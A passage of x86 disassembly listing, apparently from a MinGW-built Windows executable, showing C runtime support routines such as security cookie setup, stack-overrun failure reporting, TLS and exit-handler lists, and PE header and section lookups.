  409d3e:	e8 ad fc ff ff       	call   0x4099f0
  409d43:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  409d47:	66 89 06             	mov    %ax,(%esi)
  409d4a:	83 c3 0c             	add    $0xc,%ebx
  409d4d:	81 fb c8 0f 41 00    	cmp    $0x410fc8,%ebx
  409d53:	0f 82 8e fe ff ff    	jb     0x409be7
  409d59:	e9 15 ff ff ff       	jmp    0x409c73
  409d5e:	0f b6 06             	movzbl (%esi),%eax
  409d61:	0f b6 d0             	movzbl %al,%edx
  409d64:	89 d1                	mov    %edx,%ecx
  409d66:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  409d6c:	84 c0                	test   %al,%al
  409d6e:	0f 48 d1             	cmovs  %ecx,%edx
  409d71:	89 f0                	mov    %esi,%eax
  409d73:	2b 55 c4             	sub    -0x3c(%ebp),%edx
  409d76:	01 fa                	add    %edi,%edx
  409d78:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409d7b:	e8 70 fc ff ff       	call   0x4099f0
  409d80:	0f b6 45 cc          	movzbl -0x34(%ebp),%eax
  409d84:	88 06                	mov    %al,(%esi)
  409d86:	eb c2                	jmp    0x409d4a
  409d88:	2b 7d c4             	sub    -0x3c(%ebp),%edi
  409d8b:	89 f0                	mov    %esi,%eax
  409d8d:	03 3e                	add    (%esi),%edi
  409d8f:	89 7d cc             	mov    %edi,-0x34(%ebp)
  409d92:	e8 59 fc ff ff       	call   0x4099f0
  409d97:	89 3e                	mov    %edi,(%esi)
  409d99:	eb af                	jmp    0x409d4a
  409d9b:	8b 0d f4 d2 41 00    	mov    0x41d2f4,%ecx
  409da1:	01 f1                	add    %esi,%ecx
  409da3:	8b 41 04             	mov    0x4(%ecx),%eax
  409da6:	89 44 24 08          	mov    %eax,0x8(%esp)
  409daa:	8b 41 08             	mov    0x8(%ecx),%eax
  409dad:	8b 40 08             	mov    0x8(%eax),%eax
  409db0:	c7 04 24 c4 03 41 00 	movl   $0x4103c4,(%esp)
  409db7:	89 44 24 04          	mov    %eax,0x4(%esp)
  409dbb:	e8 d0 fb ff ff       	call   0x409990
  409dc0:	89 44 24 04          	mov    %eax,0x4(%esp)
  409dc4:	c7 04 24 20 04 41 00 	movl   $0x410420,(%esp)
  409dcb:	e8 c0 fb ff ff       	call   0x409990
  409dd0:	db e3                	fninit
  409dd2:	c3                   	ret
  409dd3:	90                   	nop
  409dd4:	90                   	nop
  409dd5:	90                   	nop
  409dd6:	90                   	nop
  409dd7:	90                   	nop
  409dd8:	90                   	nop
  409dd9:	90                   	nop
  409dda:	90                   	nop
  409ddb:	90                   	nop
  409ddc:	90                   	nop
  409ddd:	90                   	nop
  409dde:	90                   	nop
  409ddf:	90                   	nop
  409de0:	a1 18 b0 40 00       	mov    0x40b018,%eax
  409de5:	8b 00                	mov    (%eax),%eax
  409de7:	85 c0                	test   %eax,%eax
  409de9:	74 1f                	je     0x409e0a
  409deb:	83 ec 0c             	sub    $0xc,%esp
  409dee:	66 90                	xchg   %ax,%ax
  409df0:	ff d0                	call   *%eax
  409df2:	a1 18 b0 40 00       	mov    0x40b018,%eax
  409df7:	8d 50 04             	lea    0x4(%eax),%edx
  409dfa:	8b 40 04             	mov    0x4(%eax),%eax
  409dfd:	89 15 18 b0 40 00    	mov    %edx,0x40b018
  409e03:	85 c0                	test   %eax,%eax
  409e05:	75 e9                	jne    0x409df0
  409e07:	83 c4 0c             	add    $0xc,%esp
  409e0a:	f3 c3                	repz ret
  409e0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409e10:	53                   	push   %ebx
  409e11:	83 ec 18             	sub    $0x18,%esp
  409e14:	8b 1d 50 a9 40 00    	mov    0x40a950,%ebx
  409e1a:	83 fb ff             	cmp    $0xffffffff,%ebx
  409e1d:	74 24                	je     0x409e43
  409e1f:	85 db                	test   %ebx,%ebx
  409e21:	74 0f                	je     0x409e32
  409e23:	ff 14 9d 50 a9 40 00 	call   *0x40a950(,%ebx,4)
  409e2a:	83 eb 01             	sub    $0x1,%ebx
  409e2d:	8d 76 00             	lea    0x0(%esi),%esi
  409e30:	75 f1                	jne    0x409e23
  409e32:	c7 04 24 e0 9d 40 00 	movl   $0x409de0,(%esp)
  409e39:	e8 12 f9 ff ff       	call   0x409750
  409e3e:	83 c4 18             	add    $0x18,%esp
  409e41:	5b                   	pop    %ebx
  409e42:	c3                   	ret
  409e43:	31 db                	xor    %ebx,%ebx
  409e45:	eb 02                	jmp    0x409e49
  409e47:	89 c3                	mov    %eax,%ebx
  409e49:	8d 43 01             	lea    0x1(%ebx),%eax
  409e4c:	8b 14 85 50 a9 40 00 	mov    0x40a950(,%eax,4),%edx
  409e53:	85 d2                	test   %edx,%edx
  409e55:	75 f0                	jne    0x409e47
  409e57:	eb c6                	jmp    0x409e1f
  409e59:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409e60:	a1 f8 d2 41 00       	mov    0x41d2f8,%eax
  409e65:	85 c0                	test   %eax,%eax
  409e67:	74 07                	je     0x409e70
  409e69:	f3 c3                	repz ret
  409e6b:	90                   	nop
  409e6c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409e70:	c7 05 f8 d2 41 00 01 	movl   $0x1,0x41d2f8
  409e77:	00 00 00 
  409e7a:	eb 94                	jmp    0x409e10
  409e7c:	90                   	nop
  409e7d:	90                   	nop
  409e7e:	90                   	nop
  409e7f:	90                   	nop
  409e80:	55                   	push   %ebp
  409e81:	89 e5                	mov    %esp,%ebp
  409e83:	57                   	push   %edi
  409e84:	56                   	push   %esi
  409e85:	53                   	push   %ebx
  409e86:	83 ec 2c             	sub    $0x2c,%esp
  409e89:	a1 30 b0 40 00       	mov    0x40b030,%eax
  409e8e:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  409e95:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  409e9c:	3d 4e e6 40 bb       	cmp    $0xbb40e64e,%eax
  409ea1:	74 0f                	je     0x409eb2
  409ea3:	f7 d0                	not    %eax
  409ea5:	a3 34 b0 40 00       	mov    %eax,0x40b034
  409eaa:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409ead:	5b                   	pop    %ebx
  409eae:	5e                   	pop    %esi
  409eaf:	5f                   	pop    %edi
  409eb0:	5d                   	pop    %ebp
  409eb1:	c3                   	ret
  409eb2:	8d 45 d8             	lea    -0x28(%ebp),%eax
  409eb5:	89 04 24             	mov    %eax,(%esp)
  409eb8:	ff 15 4c e2 41 00    	call   *0x41e24c
  409ebe:	8b 75 d8             	mov    -0x28(%ebp),%esi
  409ec1:	8b 7d dc             	mov    -0x24(%ebp),%edi
  409ec4:	31 fe                	xor    %edi,%esi
  409ec6:	83 ec 04             	sub    $0x4,%esp
  409ec9:	ff 15 24 e2 41 00    	call   *0x41e224
  409ecf:	89 c3                	mov    %eax,%ebx
  409ed1:	ff 15 28 e2 41 00    	call   *0x41e228
  409ed7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  409eda:	ff 15 54 e2 41 00    	call   *0x41e254
  409ee0:	89 45 d0             	mov    %eax,-0x30(%ebp)
  409ee3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409ee6:	89 04 24             	mov    %eax,(%esp)
  409ee9:	ff 15 6c e2 41 00    	call   *0x41e26c
  409eef:	33 75 e0             	xor    -0x20(%ebp),%esi
  409ef2:	33 75 e4             	xor    -0x1c(%ebp),%esi
  409ef5:	31 de                	xor    %ebx,%esi
  409ef7:	33 75 d4             	xor    -0x2c(%ebp),%esi
  409efa:	83 ec 04             	sub    $0x4,%esp
  409efd:	33 75 d0             	xor    -0x30(%ebp),%esi
  409f00:	81 fe 4e e6 40 bb    	cmp    $0xbb40e64e,%esi
  409f06:	74 18                	je     0x409f20
  409f08:	89 f0                	mov    %esi,%eax
  409f0a:	f7 d0                	not    %eax
  409f0c:	89 35 30 b0 40 00    	mov    %esi,0x40b030
  409f12:	a3 34 b0 40 00       	mov    %eax,0x40b034
  409f17:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409f1a:	5b                   	pop    %ebx
  409f1b:	5e                   	pop    %esi
  409f1c:	5f                   	pop    %edi
  409f1d:	5d                   	pop    %ebp
  409f1e:	c3                   	ret
  409f1f:	90                   	nop
  409f20:	b8 b0 19 bf 44       	mov    $0x44bf19b0,%eax
  409f25:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  409f2a:	eb e0                	jmp    0x409f0c
  409f2c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409f30:	55                   	push   %ebp
  409f31:	89 e5                	mov    %esp,%ebp
  409f33:	83 ec 28             	sub    $0x28,%esp
  409f36:	8b 45 04             	mov    0x4(%ebp),%eax
  409f39:	8d 55 04             	lea    0x4(%ebp),%edx
  409f3c:	89 15 c4 d3 41 00    	mov    %edx,0x41d3c4
  409f42:	c7 05 e0 d5 41 00 09 	movl   $0xc0000409,0x41d5e0
  409f49:	04 00 c0 
  409f4c:	c7 05 e4 d5 41 00 01 	movl   $0x1,0x41d5e4
  409f53:	00 00 00 
  409f56:	a3 b8 d3 41 00       	mov    %eax,0x41d3b8
  409f5b:	a3 ec d5 41 00       	mov    %eax,0x41d5ec
  409f60:	8b 45 08             	mov    0x8(%ebp),%eax
  409f63:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  409f6a:	a3 ac d3 41 00       	mov    %eax,0x41d3ac
  409f6f:	a1 30 b0 40 00       	mov    0x40b030,%eax
  409f74:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409f77:	a1 34 b0 40 00       	mov    0x40b034,%eax
  409f7c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409f7f:	ff 15 78 e2 41 00    	call   *0x41e278
  409f85:	83 ec 04             	sub    $0x4,%esp
  409f88:	c7 04 24 80 04 41 00 	movl   $0x410480,(%esp)
  409f8f:	ff 15 88 e2 41 00    	call   *0x41e288
  409f95:	83 ec 04             	sub    $0x4,%esp
  409f98:	ff 15 20 e2 41 00    	call   *0x41e220
  409f9e:	c7 44 24 04 09 04 00 	movl   $0xc0000409,0x4(%esp)
  409fa5:	c0 
  409fa6:	89 04 24             	mov    %eax,(%esp)
  409fa9:	ff 15 80 e2 41 00    	call   *0x41e280
  409faf:	83 ec 08             	sub    $0x8,%esp
  409fb2:	e8 81 09 00 00       	call   0x40a938
  409fb7:	90                   	nop
  409fb8:	90                   	nop
  409fb9:	90                   	nop
  409fba:	90                   	nop
  409fbb:	90                   	nop
  409fbc:	90                   	nop
  409fbd:	90                   	nop
  409fbe:	90                   	nop
  409fbf:	90                   	nop
  409fc0:	55                   	push   %ebp
  409fc1:	89 e5                	mov    %esp,%ebp
  409fc3:	57                   	push   %edi
  409fc4:	56                   	push   %esi
  409fc5:	53                   	push   %ebx
  409fc6:	83 ec 1c             	sub    $0x1c,%esp
  409fc9:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  409fd0:	ff 15 10 e2 41 00    	call   *0x41e210
  409fd6:	8b 3d 40 d6 41 00    	mov    0x41d640,%edi
  409fdc:	8b 35 34 e2 41 00    	mov    0x41e234,%esi
  409fe2:	83 ec 04             	sub    $0x4,%esp
  409fe5:	85 ff                	test   %edi,%edi
  409fe7:	74 30                	je     0x40a019
  409fe9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409ff0:	8b 07                	mov    (%edi),%eax
  409ff2:	89 04 24             	mov    %eax,(%esp)
  409ff5:	ff 15 84 e2 41 00    	call   *0x41e284
  409ffb:	83 ec 04             	sub    $0x4,%esp
  409ffe:	89 c3                	mov    %eax,%ebx
  40a000:	ff d6                	call   *%esi
  40a002:	85 c0                	test   %eax,%eax
  40a004:	75 0c                	jne    0x40a012
  40a006:	85 db                	test   %ebx,%ebx
  40a008:	74 08                	je     0x40a012
  40a00a:	8b 47 04             	mov    0x4(%edi),%eax
  40a00d:	89 1c 24             	mov    %ebx,(%esp)
  40a010:	ff d0                	call   *%eax
  40a012:	8b 7f 08             	mov    0x8(%edi),%edi
  40a015:	85 ff                	test   %edi,%edi
  40a017:	75 d7                	jne    0x409ff0
  40a019:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a020:	ff 15 5c e2 41 00    	call   *0x41e25c
  40a026:	83 ec 04             	sub    $0x4,%esp
  40a029:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40a02c:	5b                   	pop    %ebx
  40a02d:	5e                   	pop    %esi
  40a02e:	5f                   	pop    %edi
  40a02f:	5d                   	pop    %ebp
  40a030:	c3                   	ret
  40a031:	eb 0d                	jmp    0x40a040
  40a033:	90                   	nop
  40a034:	90                   	nop
  40a035:	90                   	nop
  40a036:	90                   	nop
  40a037:	90                   	nop
  40a038:	90                   	nop
  40a039:	90                   	nop
  40a03a:	90                   	nop
  40a03b:	90                   	nop
  40a03c:	90                   	nop
  40a03d:	90                   	nop
  40a03e:	90                   	nop
  40a03f:	90                   	nop
  40a040:	55                   	push   %ebp
  40a041:	89 e5                	mov    %esp,%ebp
  40a043:	56                   	push   %esi
  40a044:	31 f6                	xor    %esi,%esi
  40a046:	53                   	push   %ebx
  40a047:	83 ec 10             	sub    $0x10,%esp
  40a04a:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a04f:	85 c0                	test   %eax,%eax
  40a051:	75 0d                	jne    0x40a060
  40a053:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40a056:	89 f0                	mov    %esi,%eax
  40a058:	5b                   	pop    %ebx
  40a059:	5e                   	pop    %esi
  40a05a:	5d                   	pop    %ebp
  40a05b:	c3                   	ret
  40a05c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a060:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  40a067:	00 
  40a068:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40a06f:	e8 ec 07 00 00       	call   0x40a860
  40a074:	85 c0                	test   %eax,%eax
  40a076:	89 c3                	mov    %eax,%ebx
  40a078:	74 42                	je     0x40a0bc
  40a07a:	8b 45 08             	mov    0x8(%ebp),%eax
  40a07d:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a084:	89 03                	mov    %eax,(%ebx)
  40a086:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a089:	89 43 04             	mov    %eax,0x4(%ebx)
  40a08c:	ff 15 10 e2 41 00    	call   *0x41e210
  40a092:	a1 40 d6 41 00       	mov    0x41d640,%eax
  40a097:	89 1d 40 d6 41 00    	mov    %ebx,0x41d640
  40a09d:	89 43 08             	mov    %eax,0x8(%ebx)
  40a0a0:	83 ec 04             	sub    $0x4,%esp
  40a0a3:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a0aa:	ff 15 5c e2 41 00    	call   *0x41e25c
  40a0b0:	89 f0                	mov    %esi,%eax
  40a0b2:	83 ec 04             	sub    $0x4,%esp
  40a0b5:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40a0b8:	5b                   	pop    %ebx
  40a0b9:	5e                   	pop    %esi
  40a0ba:	5d                   	pop    %ebp
  40a0bb:	c3                   	ret
  40a0bc:	be ff ff ff ff       	mov    $0xffffffff,%esi
  40a0c1:	eb 90                	jmp    0x40a053
  40a0c3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a0c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a0d0:	55                   	push   %ebp
  40a0d1:	89 e5                	mov    %esp,%ebp
  40a0d3:	53                   	push   %ebx
  40a0d4:	83 ec 14             	sub    $0x14,%esp
  40a0d7:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a0dc:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40a0df:	85 c0                	test   %eax,%eax
  40a0e1:	75 0d                	jne    0x40a0f0
  40a0e3:	31 c0                	xor    %eax,%eax
  40a0e5:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40a0e8:	c9                   	leave
  40a0e9:	c3                   	ret
  40a0ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a0f0:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a0f7:	ff 15 10 e2 41 00    	call   *0x41e210
  40a0fd:	8b 15 40 d6 41 00    	mov    0x41d640,%edx
  40a103:	83 ec 04             	sub    $0x4,%esp
  40a106:	85 d2                	test   %edx,%edx
  40a108:	74 17                	je     0x40a121
  40a10a:	8b 02                	mov    (%edx),%eax
  40a10c:	39 d8                	cmp    %ebx,%eax
  40a10e:	75 0a                	jne    0x40a11a
  40a110:	eb 46                	jmp    0x40a158
  40a112:	8b 08                	mov    (%eax),%ecx
  40a114:	39 d9                	cmp    %ebx,%ecx
  40a116:	74 20                	je     0x40a138
  40a118:	89 c2                	mov    %eax,%edx
  40a11a:	8b 42 08             	mov    0x8(%edx),%eax
  40a11d:	85 c0                	test   %eax,%eax
  40a11f:	75 f1                	jne    0x40a112
  40a121:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a128:	ff 15 5c e2 41 00    	call   *0x41e25c
  40a12e:	83 ec 04             	sub    $0x4,%esp
  40a131:	31 c0                	xor    %eax,%eax
  40a133:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40a136:	c9                   	leave
  40a137:	c3                   	ret
  40a138:	8b 48 08             	mov    0x8(%eax),%ecx
  40a13b:	89 4a 08             	mov    %ecx,0x8(%edx)
  40a13e:	89 04 24             	mov    %eax,(%esp)
  40a141:	e8 c2 06 00 00       	call   0x40a808
  40a146:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a14d:	ff 15 5c e2 41 00    	call   *0x41e25c
  40a153:	83 ec 04             	sub    $0x4,%esp
  40a156:	eb d9                	jmp    0x40a131
  40a158:	8b 42 08             	mov    0x8(%edx),%eax
  40a15b:	a3 40 d6 41 00       	mov    %eax,0x41d640
  40a160:	89 d0                	mov    %edx,%eax
  40a162:	eb da                	jmp    0x40a13e
  40a164:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40a16a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  40a170:	55                   	push   %ebp
  40a171:	89 e5                	mov    %esp,%ebp
  40a173:	83 ec 18             	sub    $0x18,%esp
  40a176:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a179:	83 f8 01             	cmp    $0x1,%eax
  40a17c:	74 46                	je     0x40a1c4
  40a17e:	72 15                	jb     0x40a195
  40a180:	83 f8 03             	cmp    $0x3,%eax
  40a183:	75 09                	jne    0x40a18e
  40a185:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a18a:	85 c0                	test   %eax,%eax
  40a18c:	75 64                	jne    0x40a1f2
  40a18e:	b8 01 00 00 00       	mov    $0x1,%eax
  40a193:	c9                   	leave
  40a194:	c3                   	ret
  40a195:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a19a:	85 c0                	test   %eax,%eax
  40a19c:	75 62                	jne    0x40a200
  40a19e:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a1a3:	83 f8 01             	cmp    $0x1,%eax
  40a1a6:	75 e6                	jne    0x40a18e
  40a1a8:	c7 05 44 d6 41 00 00 	movl   $0x0,0x41d644
  40a1af:	00 00 00 
  40a1b2:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a1b9:	ff 15 0c e2 41 00    	call   *0x41e20c
  40a1bf:	83 ec 04             	sub    $0x4,%esp
  40a1c2:	eb ca                	jmp    0x40a18e
  40a1c4:	a1 44 d6 41 00       	mov    0x41d644,%eax
  40a1c9:	85 c0                	test   %eax,%eax
  40a1cb:	74 13                	je     0x40a1e0
  40a1cd:	c7 05 44 d6 41 00 01 	movl   $0x1,0x41d644
  40a1d4:	00 00 00 
  40a1d7:	b8 01 00 00 00       	mov    $0x1,%eax
  40a1dc:	c9                   	leave
  40a1dd:	c3                   	ret
  40a1de:	66 90                	xchg   %ax,%ax
  40a1e0:	c7 04 24 48 d6 41 00 	movl   $0x41d648,(%esp)
  40a1e7:	ff 15 58 e2 41 00    	call   *0x41e258
  40a1ed:	83 ec 04             	sub    $0x4,%esp
  40a1f0:	eb db                	jmp    0x40a1cd
  40a1f2:	e8 c9 fd ff ff       	call   0x409fc0
  40a1f7:	eb 95                	jmp    0x40a18e
  40a1f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a200:	e8 bb fd ff ff       	call   0x409fc0
  40a205:	eb 97                	jmp    0x40a19e
  40a207:	90                   	nop
  40a208:	90                   	nop
  40a209:	90                   	nop
  40a20a:	90                   	nop
  40a20b:	90                   	nop
  40a20c:	90                   	nop
  40a20d:	90                   	nop
  40a20e:	90                   	nop
  40a20f:	90                   	nop
  40a210:	03 40 3c             	add    0x3c(%eax),%eax
  40a213:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  40a219:	74 05                	je     0x40a220
  40a21b:	31 c0                	xor    %eax,%eax
  40a21d:	c3                   	ret
  40a21e:	66 90                	xchg   %ax,%ax
  40a220:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  40a226:	0f 94 c0             	sete   %al
  40a229:	0f b6 c0             	movzbl %al,%eax
  40a22c:	c3                   	ret
  40a22d:	8d 76 00             	lea    0x0(%esi),%esi
  40a230:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a234:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  40a239:	74 05                	je     0x40a240
  40a23b:	31 c0                	xor    %eax,%eax
  40a23d:	c3                   	ret
  40a23e:	66 90                	xchg   %ax,%ax
  40a240:	eb ce                	jmp    0x40a210
  40a242:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a249:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  40a250:	56                   	push   %esi
  40a251:	53                   	push   %ebx
  40a252:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40a256:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40a25a:	03 52 3c             	add    0x3c(%edx),%edx
  40a25d:	0f b7 72 06          	movzwl 0x6(%edx),%esi
  40a261:	0f b7 42 14          	movzwl 0x14(%edx),%eax
  40a265:	85 f6                	test   %esi,%esi
  40a267:	8d 44 02 18          	lea    0x18(%edx,%eax,1),%eax
  40a26b:	74 1b                	je     0x40a288
  40a26d:	31 d2                	xor    %edx,%edx
  40a26f:	90                   	nop
  40a270:	8b 48 0c             	mov    0xc(%eax),%ecx
  40a273:	39 d9                	cmp    %ebx,%ecx
  40a275:	77 07                	ja     0x40a27e
  40a277:	03 48 08             	add    0x8(%eax),%ecx
  40a27a:	39 cb                	cmp    %ecx,%ebx
  40a27c:	72 0c                	jb     0x40a28a
  40a27e:	83 c2 01             	add    $0x1,%edx
  40a281:	83 c0 28             	add    $0x28,%eax
  40a284:	39 f2                	cmp    %esi,%edx
  40a286:	72 e8                	jb     0x40a270
  40a288:	31 c0                	xor    %eax,%eax
  40a28a:	5b                   	pop    %ebx
  40a28b:	5e                   	pop    %esi
  40a28c:	c3                   	ret
  40a28d:	8d 76 00             	lea    0x0(%esi),%esi
  40a290:	55                   	push   %ebp
  40a291:	57                   	push   %edi
  40a292:	56                   	push   %esi
  40a293:	31 f6                	xor    %esi,%esi
  40a295:	53                   	push   %ebx
  40a296:	83 ec 1c             	sub    $0x1c,%esp
  40a299:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40a29d:	89 3c 24             	mov    %edi,(%esp)
  40a2a0:	e8 93 05 00 00       	call   0x40a838
  40a2a5:	83 f8 08             	cmp    $0x8,%eax
  40a2a8:	77 0b                	ja     0x40a2b5
  40a2aa:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a2b1:	4d 5a 
  40a2b3:	74 0b                	je     0x40a2c0
  40a2b5:	83 c4 1c             	add    $0x1c,%esp
  40a2b8:	89 f0                	mov    %esi,%eax
  40a2ba:	5b                   	pop    %ebx
  40a2bb:	5e                   	pop    %esi
  40a2bc:	5f                   	pop    %edi
  40a2bd:	5d                   	pop    %ebp
  40a2be:	c3                   	ret
  40a2bf:	90                   	nop
  40a2c0:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a2c5:	e8 46 ff ff ff       	call   0x40a210
  40a2ca:	85 c0                	test   %eax,%eax
  40a2cc:	74 e7                	je     0x40a2b5
  40a2ce:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a2d3:	8d 90 00 00 40 00    	lea    0x400000(%eax),%edx
  40a2d9:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  40a2e0:	0f b7 6a 06          	movzwl 0x6(%edx),%ebp
  40a2e4:	8d 5c 02 18          	lea    0x18(%edx,%eax,1),%ebx
  40a2e8:	85 ed                	test   %ebp,%ebp
  40a2ea:	75 0e                	jne    0x40a2fa
  40a2ec:	eb c7                	jmp    0x40a2b5
  40a2ee:	66 90                	xchg   %ax,%ax
  40a2f0:	83 c6 01             	add    $0x1,%esi
  40a2f3:	83 c3 28             	add    $0x28,%ebx
  40a2f6:	39 ee                	cmp    %ebp,%esi
  40a2f8:	73 26                	jae    0x40a320
  40a2fa:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  40a301:	00 
  40a302:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40a306:	89 1c 24             	mov    %ebx,(%esp)
  40a309:	e8 32 05 00 00       	call   0x40a840
  40a30e:	85 c0                	test   %eax,%eax
  40a310:	75 de                	jne    0x40a2f0
  40a312:	83 c4 1c             	add    $0x1c,%esp
  40a315:	89 de                	mov    %ebx,%esi
  40a317:	89 f0                	mov    %esi,%eax
  40a319:	5b                   	pop    %ebx
  40a31a:	5e                   	pop    %esi
  40a31b:	5f                   	pop    %edi
  40a31c:	5d                   	pop    %ebp
  40a31d:	c3                   	ret
  40a31e:	66 90                	xchg   %ax,%ax
  40a320:	83 c4 1c             	add    $0x1c,%esp
  40a323:	31 f6                	xor    %esi,%esi
  40a325:	5b                   	pop    %ebx
  40a326:	89 f0                	mov    %esi,%eax
  40a328:	5e                   	pop    %esi
  40a329:	5f                   	pop    %edi
  40a32a:	5d                   	pop    %ebp
  40a32b:	c3                   	ret
  40a32c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40a330:	53                   	push   %ebx
  40a331:	31 db                	xor    %ebx,%ebx
  40a333:	83 ec 08             	sub    $0x8,%esp
  40a336:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a33d:	4d 5a 
  40a33f:	74 07                	je     0x40a348
  40a341:	83 c4 08             	add    $0x8,%esp
  40a344:	89 d8                	mov    %ebx,%eax
  40a346:	5b                   	pop    %ebx
  40a347:	c3                   	ret
  40a348:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a34d:	e8 be fe ff ff       	call   0x40a210
  40a352:	85 c0                	test   %eax,%eax
  40a354:	74 eb                	je     0x40a341
  40a356:	8b 44 24 10          	mov    0x10(%esp),%eax
  40a35a:	c7 04 24 00 00 40 00 	movl   $0x400000,(%esp)
  40a361:	2d 00 00 40 00       	sub    $0x400000,%eax
  40a366:	89 44 24 04          	mov    %eax,0x4(%esp)
  40a36a:	e8 e1 fe ff ff       	call   0x40a250
  40a36f:	83 c4 08             	add    $0x8,%esp
  40a372:	89 c3                	mov    %eax,%ebx
  40a374:	89 d8                	mov    %ebx,%eax
  40a376:	5b                   	pop    %ebx
  40a377:	c3                   	ret
  40a378:	90                   	nop
  40a379:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40a380:	53                   	push   %ebx
  40a381:	31 db                	xor    %ebx,%ebx
  40a383:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a38a:	4d 5a 
  40a38c:	74 04                	je     0x40a392
  40a38e:	89 d8                	mov    %ebx,%eax
  40a390:	5b                   	pop    %ebx
  40a391:	c3                   	ret
  40a392:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a397:	e8 74 fe ff ff       	call   0x40a210
  40a39c:	85 c0                	test   %eax,%eax
  40a39e:	74 ee                	je     0x40a38e
  40a3a0:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a3a5:	0f b7 98 06 00 40 00 	movzwl 0x400006(%eax),%ebx
  40a3ac:	89 d8                	mov    %ebx,%eax
  40a3ae:	5b                   	pop    %ebx
  40a3af:	c3                   	ret
  40a3b0:	56                   	push   %esi
  40a3b1:	31 f6                	xor    %esi,%esi
  40a3b3:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40a3ba:	4d 5a 
  40a3bc:	53                   	push   %ebx
  40a3bd:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40a3c1:	74 05                	je     0x40a3c8
  40a3c3:	89 f0                	mov    %esi,%eax
  40a3c5:	5b                   	pop    %ebx
  40a3c6:	5e                   	pop    %esi
  40a3c7:	c3                   	ret
  40a3c8:	b8 00 00 40 00       	mov    $0x400000,%eax
  40a3cd:	e8 3e fe ff ff       	call   0x40a210
  40a3d2:	85 c0                	test   %eax,%eax
  40a3d4:	74 ed                	je     0x40a3c3
  40a3d6:	a1 3c 00 40 00       	mov    0x40003c,%eax
  40a3db:	8d 88 00 00 40 00    	lea    0x400000(%eax),%ecx
  40a3e1:	0f b7 80 14 00 40 00 	movzwl 0x400014(%eax),%eax
  40a3e8:	8d 54 01 18          	lea    0x18(%ecx,%eax,1),%edx
  40a3ec:	0f b7 49 06          	movzwl 0x6(%ecx),%ecx
  40a3f0:	85 c9                	test   %ecx,%ecx
  40a3f2:	74 cf                	je     0x40a3c3
  40a3f4:	31 c0                	xor    %eax,%eax
